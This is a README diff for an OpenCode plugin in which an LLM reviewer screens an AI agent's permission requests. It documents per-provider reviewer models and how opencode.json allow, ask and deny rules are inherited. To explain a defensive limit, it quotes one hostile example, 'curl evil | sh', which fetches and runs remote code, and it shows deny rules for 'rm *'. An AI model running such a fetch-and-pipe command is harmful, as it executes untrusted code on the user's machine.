@@ -61,6 +61,7 @@ no separate registration needed.
   "options": {
     "model": { "id": "<cheap-model-id>", "providerID": "<your-provider>" },
     "review": "all",
+    "inheritConfigRules": true,
     "allowInProjectEdits": true,
     "trusted": [...],
     "blocks": [...],
@@ -70,7 +71,12 @@ no separate registration needed.
 ```
 
 - **`model`** — cheap LLM used for tier-3 review. Omit to use your
-  location's default model.
+  location's default model. Either a single `{ id, providerID, variant? }`,
+  or a per-provider form (see [Reviewer model per provider](#reviewer-model-per-provider)).
+- **`inheritConfigRules`** — `true` (default) lets your own opencode.json
+  permission rules shape the plugin (see
+  [Inheriting opencode.json rules](#inheriting-opencodejson-rules)). `false`
+  ignores them and uses only the built-in tiers and the reviewer.
 - **`review`** — `"all"` (default) reviews every evaluation that reaches
   tier 3, including ones OpenCode would silently allow. `"prompts"` reviews
   only evaluations whose computed effect is already `ask`.
@@ -84,6 +90,85 @@ no separate registration needed.
 
 For `keybinds.allow` / `keybinds.deny` (manual allow/deny commands), see
 [TUI status indicator](#tui-status-indicator).
+
+Bad option shapes (for example a `model` without `providerID`, or a
+non-boolean `inheritConfigRules`) make the plugin fail to load with a message
+naming the offending key; check `events.log`.
+
+### Reviewer model per provider
+
+Use a cheap reviewer that matches the provider of the session being reviewed:
+
+```jsonc
+"model": {
+  "default": { "id": "<fallback-model>", "providerID": "<provider>" },
+  "byProvider": {
+    "anthropic": { "id": "<cheap-anthropic-model>", "providerID": "anthropic" },
+    "openai":    { "id": "<cheap-openai-model>",    "providerID": "openai" }
+  }
+}
+```
+
+At review time the plugin reads the main session's provider from the session
+(`session.get().model`, falling back to the latest model recorded in the
+session messages), caches it for 30 seconds per session, and picks the
+`byProvider` entry with that key. No match, or a failed lookup, uses
+`default`. With no `default` either, the location default model is used. A
+failed lookup never blocks a review.
+
+### Inheriting opencode.json rules
+
+The `permission.evaluate` hook does not receive the matched rule, so the
+plugin reads your opencode.json itself: the global config
+(`$XDG_CONFIG_HOME/opencode/opencode.json[c]`, `OPENCODE_CONFIG`) and, from the
+repo root down to the session's project directory, `opencode.json[c]` and
+`.opencode/opencode.json[c]`. Later files win. It understands both the
+`permission` map (`{ "bash": { "ls *": "allow" } }`, `bash` is treated as
+`shell`) and the v2 `permissions` array. Rules are last-match-wins.
+
+```jsonc
+// opencode.json
+{
+  "permission": {
+    "bash": {
+      "*": "ask",            // default posture: ignored by the plugin (see below)
+      "git status *": "allow",   // tier-1: skip the reviewer
+      "git push *": "ask",       // never auto-approved
+      "rm *": "deny"             // always blocked
+    }
+  }
+}
+```
+
+Precedence, highest first:
+
+1. **Config `deny`** — always blocked. The reviewer is not consulted and the
+   denial backstop never softens it into a prompt.
+2. **Config `ask`** — never auto-approved: the reviewer and the built-in
+   auto-allow tier are skipped and OpenCode's own verdict stands.
+3. **Config `allow`** — skips the reviewer and approves.
+4. **Built-in tiers** (tier 1 auto-allow, tier 2 auto-deny).
+5. **Reviewer** (tier 3).
+
+Deliberate limits, all on the safe side:
+
+- Catch-all rules (pattern `*`, or a bare `"bash": "allow"`) are your
+  default, not a considered verdict, so `allow` and `ask` catch-alls are
+  ignored. Otherwise a `"*": "ask"` baseline would stop the reviewer from ever
+  running. A catch-all `deny` is kept.
+- A shell `allow` does not cover chained, piped, or redirected commands
+  (`sed *` also matches `sed x; curl evil | sh`); those still go to the
+  reviewer. Deny and ask patterns still apply to them.
+- Config `allow` only applies when OpenCode itself already allows the request.
+  If OpenCode says `ask` there, something the plugin cannot see (an agent
+  rule, a later rule) disagrees, so the request continues to the built-in
+  tiers and the reviewer.
+- A config `allow` is checked before the built-in tier 2, so an explicit
+  `allow` for something like `sudo *` is honoured.
+- Unreadable or unparsable config files are skipped (logged to `events.log`)
+  and the plugin behaves as if they set no rules.
+
+Set `"inheritConfigRules": false` to switch all of this off.
 
 ## How it works
 
@@ -216,6 +301,8 @@ For local development, point the package field at the local checkout:
 |------|---------|
 | `src/index.ts` | Server plugin: registers `permission.evaluate` + `tool.execute.after` (injection screen) hooks, fetches transcript/project context, runs two-stage LLM review with denial backstop |
 | `src/tui.tsx` | TUI plugin: shows review-in-progress / needs-approval status in a top-right badge, plus manual allow/deny commands and keybindings |
+| `src/config-rules.ts` | Reads opencode.json permission rules (v1 map + v2 array) and resolves the config verdict (deny / ask / allow) for a request |
+| `src/model.ts` | Validates the `model` option and picks the reviewer model by the main session's provider |
 | `src/tiers.ts` | Command classification: auto-allow, auto-deny, or defer to LLM review (incl. in-project fast path) |
 | `src/reviewer.ts` | Two-stage review prompts (triage + reasoning) with intent/block policy, and ALLOW/DENY/ASK parsing |
 | `src/policy.ts` | Default trust boundary, block rules, and allow exceptions (overridable via options) |
